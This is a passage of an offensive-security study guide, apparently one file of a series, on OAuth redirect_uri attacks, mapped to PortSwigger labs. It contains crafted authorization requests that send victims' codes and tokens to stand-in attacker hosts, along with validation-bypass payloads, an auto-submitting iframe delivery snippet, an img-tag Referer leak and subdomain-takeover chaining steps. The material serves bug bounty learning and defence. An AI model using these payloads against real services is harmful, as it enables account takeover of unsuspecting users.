# redirect_uri Attacks: Authorization Code Interception

## Why This Parameter Matters More Than Any Other

If you only have time to master one OAuth attack surface, make it this one. `redirect_uri` validation failures are the single most common source of real, high-severity OAuth findings in bug bounty programs, and PortSwigger built three separate labs around variations of it. The reason it's so productive: the parameter has to be flexible enough to support legitimate use cases (multiple callback paths, localhost development, mobile deep links) while being strict enough to guarantee that a code or token can never reach anywhere except the legitimate client. Most implementations get that balance wrong in one direction or the other.

Prerequisite: read File 1's breakdown of the Authorization Code flow, specifically Step 3 and Step 4, before this file — everything here assumes you understand why the code is short-lived and why the back-channel redirect_uri re-check matters.

---

## 1. The Core Vulnerability Mechanism

Recall from File 1: after the user authenticates and consents, the authorization server redirects the browser to `redirect_uri` with the authorization code attached:

```
HTTP/1.1 302 Found
Location: https://client-app.com/callback?code=SplxlOBeZQQYbYS6WxSbIA&state=xyz789
```

**The trust assumption being exploited:** the authorization server is supposed to check the `redirect_uri` supplied in the initial `/auth` request against a pre-registered whitelist of exact callback URLs for that `client_id`. If that check is missing, partial, or bypassable, an attacker can supply their own domain as `redirect_uri` and have the authorization server hand the victim's authorization code directly to attacker-controlled infrastructure:

```
GET /auth?client_id=a1b2c3&redirect_uri=https://attacker.net/steal&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: oauth-authorization-server.com
```

If the server accepts this, and a victim's browser is tricked into completing this flow (typically via an auto-submitting iframe or redirect hosted on attacker infrastructure), the code lands in the attacker's own server logs.

### Why stealing the code is enough — no client_secret needed

This is the part that surprises people new to OAuth: for the Authorization Code flow, stealing the code is often sufficient to fully hijack the victim's session on the client application, **without ever knowing the client_secret**. Here's why: the attacker doesn't redeem the stolen code themselves against the token endpoint (which would require the secret). Instead, the attacker takes the stolen code and simply navigates their **own browser** to the client application's real callback URL:

```
https://client-app.com/oauth-callback?code=STOLEN_CODE
```

The client application's backend — which does hold the `client_secret` — completes the code/token exchange as it normally would, has no way to know the code didn't originate from a legitimate flow the attacker initiated themselves, and logs the attacker in as the victim. This is the mechanism behind PortSwigger's **"OAuth account hijacking via redirect_uri"** lab, and it's the mental model to hold onto for the rest of this file: the goal of every redirect_uri attack is to get a code delivered somewhere the attacker can read it, then replay that code against the real, legitimate callback endpoint before it expires or gets used.

### Why state and nonce don't save you here

A common misconception is that a properly implemented `state` parameter prevents this. It doesn't, and it's worth understanding precisely why: `state` protects against the attacker forging a request *the victim didn't initiate* (covered in File 3). But in a redirect_uri interception attack, the victim genuinely is completing a real OAuth flow — the attacker just redirected where the result gets delivered. The `state` value the victim's browser sends back will match whatever `state` the authorization server issued for that specific flow, because the attacker never had to guess it — they just captured whatever the browser produced. The only real defense is the authorization server correctly enforcing the redirect_uri whitelist, plus (as covered in File 5) PKCE binding the code to the specific client instance that initiated the flow.

---

## 2. redirect_uri Validation Bypass Techniques

### 2.1 Prefix / "starts with" matching

**The flaw:** some implementations validate `redirect_uri` by checking whether it *starts with* an approved string rather than doing an exact match against the registered value.

```
redirect_uri=https://client-app.com.attacker.net/callback
```

If validation logic is something like `redirect_uri.startsWith("https://client-app.com")`, this string technically starts with the right characters and can pass a naive check, while actually pointing to a completely different, attacker-owned host (`client-app.com.attacker.net`).

**Why the server trusts it:** the validation logic conflates "string prefix" with "same origin." These are not the same thing — a URL's host is delimited by `/`, `:`, `?`, or `#`, none of which a prefix check inherently respects.

**What to test systematically:** register variations and observe which ones are accepted without error:
- Appending arbitrary subdomains: `https://attacker.client-app.com`
- Appending arbitrary paths: `https://client-app.com.attacker.net`
- Appending query parameters or fragments after the registered path

### 2.2 Path and subdirectory permissiveness

**The flaw:** the whitelist allows *any* path under an approved domain rather than pinning the exact registered callback path.

```
redirect_uri=https://client-app.com/oauth/callback
```

is registered, but the server also accepts:

```
redirect_uri=https://client-app.com/any/other/page
```

This matters because it widens your attack surface from "the OAuth callback endpoint" to "the entire client application." If you can redirect the code or token to *any* page on the legitimate domain, your next step is finding a page on that domain with its own vulnerability that leaks the query string or fragment — most commonly an open redirect (Section 2.4) or a reflected XSS / HTML injection point (covered further in File 4). This chaining approach — "I can't get an external redirect_uri, but I can point it at a different in-scope page" — is one of the highest-value techniques in this entire file, because it turns an otherwise well-locked-down redirect_uri whitelist into a full compromise via a second-order bug elsewhere on the same origin.

### 2.3 Path traversal against the registered callback

**The flaw:** the redirect_uri is validated as a string, but the actual HTTP routing on the client application resolves `../` sequences, so a URL that *looks* like it targets the legitimate callback path can actually route to something else entirely once the server processes it.

```
redirect_uri=https://client-app.com/oauth/callback/../../feedback?message=payload
```

The validation layer sees a string beginning with the registered `/oauth/callback` prefix and approves it. But the client application's own web server or framework resolves the path traversal sequence, and the request actually reaches `/feedback` — a completely different endpoint, potentially one with its own injection point that reflects the `message` parameter, giving you a way to exfiltrate the token or code from that different endpoint's context.

**Flag-by-flag breakdown of why this works:**
- `/oauth/callback` — satisfies the string-prefix check performed at authorization time.
- `/../../` — invisible to a naive prefix validator, but meaningful to the underlying router/webserver that resolves the final path before serving the request.
- `feedback?message=payload` — the real destination after resolution, chosen because it has some property useful to the attacker (reflects input, has an open redirect, etc.).

### 2.4 Open redirect chaining

This is the technique explicitly demonstrated in PortSwigger's **"Stealing OAuth access tokens via an open redirect"** lab and is worth understanding as its own reusable pattern, separate from path traversal.

**Setup:** the redirect_uri whitelist is strict about domain, but the client application itself has an open redirect vulnerability somewhere on an in-scope path — for example a `/post/next?path=` parameter that performs a client-side or server-side redirect to whatever URL is supplied.

**Attack construction:**

```
GET /auth?client_id=a1b2c3&redirect_uri=https://client-app.com/oauth-callback/../post/next?path=https://attacker-server.net/exploit&response_type=token&scope=openid%20profile%20email HTTP/1.1
Host: oauth-authorization-server.com
```

Breaking this down piece by piece:
- `redirect_uri=https://client-app.com/oauth-callback/../post/next?path=...` — this passes the whitelist check because it starts with the registered host and, depending on the implementation, may also pass a prefix check on the path (or use the path traversal technique from 2.3 to get there).
- Once the router resolves `/oauth-callback/../post/next`, the effective destination is `/post/next?path=https://attacker-server.net/exploit`, an open redirect the attacker found through separate recon of the client application.
- `response_type=token` — note this example uses the **Implicit** flow specifically, so the token is appended as a URL fragment. This is deliberate: the entire point of chaining through an open redirect is to get the browser to follow a *second* redirect off the legitimate domain, and browsers preserve URL fragments across same-document redirects performed via JavaScript `window.location` in many implementations of "open redirect" — meaning the access token in the fragment survives the hop from `client-app.com/post/next` to `attacker-server.net/exploit`, landing directly in the attacker's server logs (or accessible to attacker JavaScript at that destination).

**Why this specific chain requires attention to response_type:** for the Authorization Code flow, the code is a query parameter, which *is* sent as part of the URL during a server-initiated 3xx redirect and would leak through most open redirects trivially. For the Implicit flow, the token lives in the fragment, which is *not* automatically forwarded through a standard HTTP 3xx redirect (fragments aren't sent to the server, so a server can't even see it to forward it) — the token only survives if the open redirect is implemented client-side via JavaScript that reads and reconstructs `window.location`, which many open redirect implementations do. This is why auditing *how* an open redirect is implemented (server-side 3xx vs. client-side JS) determines whether it's exploitable for code theft, token theft, both, or neither.

### 2.5 Stealing via a proxy page (broader than just open redirect)

PortSwigger's **"Stealing OAuth access tokens via a proxy page"** lab generalizes the above: once you've established that you can set `redirect_uri` to *some* page on the legitimate whitelisted domain (via prefix bypass, path traversal, or otherwise), your job becomes auditing every reachable page on that domain for **anything** that gives you access to query parameters or URL fragments and can forward them off-domain. Beyond a classic open redirect, the topic page identifies:

- **Dangerous JavaScript handling query params/fragments** — e.g. an insecure `postMessage` handler that echoes `location.hash` to another window without origin checks (see the Client-Side JavaScript series in this library for the underlying `postMessage` mechanics).
- **XSS on the whitelisted page** — even a short-lived reflected XSS is enough, because a stolen OAuth code or token gives the attacker persistent account access, far outlasting the XSS execution window. This is a genuinely important escalation point: XSS is often rated lower on its own because session cookies are frequently `HttpOnly`, but a stolen OAuth code/token is not cookie-protected at all — it's just a string in the URL, fully readable by any JavaScript running on that page.
- **HTML injection without script execution** — if CSP blocks script injection but you can still inject markup, an `<img src="https://attacker.net">` tag is enough. Some browsers (notably Firefox, historically) send the *full URL including query string* in the `Referer` header when fetching that image, leaking a code or token that was present in the query string of the page the `<img>` tag was injected into. This is a distinct leakage channel from open redirect chaining and is expanded further in File 4.

### 2.6 Server-side parameter pollution

**The flaw:** if the authorization server's validation logic and its actual redirect logic parse duplicate query parameters differently (e.g. validation checks the *first* occurrence, but the redirect uses the *last*), you can smuggle a second value past validation.

```
https://oauth-authorization-server.com/auth?client_id=123&redirect_uri=https://client-app.com/callback&redirect_uri=https://attacker.net
```

Always worth a quick test on any redirect_uri validation, even against well-known providers — this class of bug tends to live in custom middleware layered on top of an otherwise standard OAuth library, not in the library itself.

### 2.7 localhost special-casing

**The flaw:** many authorization servers permit any `redirect_uri` beginning with `localhost` unconditionally, since `localhost` URIs are common during development and are normally assumed safe because they can only resolve on the developer's own machine.

The bypass: register (or simply supply) a domain name where `localhost` appears as a *subdomain label*, not as the actual host:

```
redirect_uri=https://localhost.attacker.net/callback
```

To a naive string check for "starts with `localhost`" or "contains `localhost`," this passes — but it resolves to `attacker.net`'s infrastructure entirely, with no relationship to the actual local machine.

---

## 3. Subdomain Takeover Chaining

A distinct but closely related technique: if the redirect_uri whitelist correctly enforces "must be exactly `*.client-app.com`" (or even an exact subdomain), and you can't find a validation bypass, check whether **any registered or plausible subdomain of the client's domain is unclaimed** — pointing to a decommissioned cloud resource (an unclaimed S3 bucket, an expired Heroku app, a dangling CNAME to a shut-down third-party service).

**Mechanism:**
1. Recon the client application's DNS for CNAME records pointing at cloud services (`*.herokuapp.com`, `*.s3.amazonaws.com`, `*.github.io`, `*.azurewebsites.net`, etc.) — standard subdomain takeover recon, covered in depth in this library's Subdomain Takeover series.
2. If a subdomain (e.g. `old-mobile.client-app.com`) has a dangling DNS record pointing to a deprovisioned resource, claim that resource on the relevant cloud platform.
3. If that subdomain is *also* a value that would pass the OAuth provider's redirect_uri whitelist (either because it was actually registered historically, or because the whitelist is a wildcard like `*.client-app.com`), you now control infrastructure that the authorization server will happily deliver authorization codes or tokens to.
4. Host a page at the claimed subdomain that logs incoming query parameters/fragments, then trigger the OAuth flow against a victim (via the standard iframe/auto-redirect delivery technique from Section 4).

**Why this matters specifically for OAuth over generic subdomain takeover:** a subdomain takeover on its own is often rated as a serious-but-not-critical issue (you can host content and phish on a trusted domain). Chained with a wildcard or historically-registered redirect_uri whitelist entry, it escalates directly to full account takeover on every user of the client application who can be tricked into completing an OAuth flow — a significant severity jump that's worth explicitly calling out in any report where you find both conditions present.

---

## 4. Delivering the Attack to a Victim

All of the techniques above describe *constructing* a malicious authorization URL. Getting a victim's browser to actually visit it typically uses one of:

- **Auto-submitting iframe** hosted on attacker infrastructure or an exploit server:
  ```html
  <iframe src="https://oauth-authorization-server.com/auth?client_id=a1b2c3&redirect_uri=https://attacker.net/steal&response_type=code&scope=openid%20profile%20email"></iframe>
  ```
  If the victim already has an active session with the OAuth service (very common — users rarely log out of Google/Facebook/etc.), this completes the entire flow silently, with no interaction and no visible page load, since the whole thing happens inside a same-origin-policy-respecting iframe that the victim never notices.

- **`window.open` / meta-refresh / JS redirect**, useful when an iframe is blocked by `X-Frame-Options` or `frame-ancestors` CSP on the authorization endpoint.

- **Direct link delivery** via phishing when the target is unlikely to have framing restrictions or when a visible navigation is acceptable for the pretext being used.

Note the precondition in every case: **the victim needs an existing session with the OAuth service**, not with the client application. Since users log into large identity providers (Google, Microsoft, GitHub) far less often than they visit individual client applications, and those sessions tend to be long-lived, this precondition is met far more often in practice than testers initially expect.

---

## 5. PortSwigger Lab Mapping (Redirect_uri Track)

Presented in the difficulty-progression order PortSwigger uses for the OAuth authentication topic:

| Difficulty | Lab | What it teaches from this file |
|---|---|---|
| Practitioner | **OAuth account hijacking via redirect_uri** | Core mechanism from Section 1 — stealing a code via an unvalidated external redirect_uri and replaying it against the legitimate callback |
| Expert | **Stealing OAuth access tokens via an open redirect** | Section 2.4 — chaining a whitelist-permitted path through an in-scope open redirect to exfiltrate an implicit-flow token via URL fragment |
| Expert | **Stealing OAuth access tokens via a proxy page** | Section 2.5 — auditing whitelisted pages for any mechanism (JS, XSS, HTML injection) that leaks query params/fragments off-domain |

**Honest gap disclosure:** I don't currently have a lab in my personal completion history mapped specifically to the raw redirect_uri prefix-bypass techniques in Sections 2.1, 2.2, 2.6, and 2.7 — PortSwigger's written topic content covers these as testing techniques within the "Flawed redirect_uri validation" section rather than as dedicated standalone labs, and they're most often encountered as sub-steps inside the two Expert-level labs above rather than labs in their own right. Subdomain takeover chaining (Section 3) is not something PortSwigger has a dedicated OAuth lab for at all — it's a real-world escalation technique documented here because it shows up in bug bounty reports, not because there's a lab to practice it against. If PortSwigger has added new labs to this topic since this file was written, treat this table as a floor, not a ceiling — check the live "OAuth authentication" section of `portswigger.net/web-security/all-labs` for the current count.

---

## Real-World Industry Note

redirect_uri validation bugs are disproportionately represented in OAuth-related bug bounty payouts because the fix is genuinely hard to get completely right at scale — a single client application might have dozens of legitimately registered callback URLs across web, mobile deep links, and multiple environments (dev/staging/prod), and every relaxation made to accommodate that legitimate complexity is a potential bypass. When testing a real target, always start by asking: what does the *actual* registered whitelist look like, and is validation doing an exact match, a prefix match, or a regex — because the answer to that question determines which of the six bypass techniques in Section 2 is worth trying first.

---

## What's Next

File 3 covers the `state` parameter — what happens when the OAuth flow's CSRF protection is missing, predictable, or present-but-not-actually-checked, and how that differs fundamentally from the interception attacks in this file.
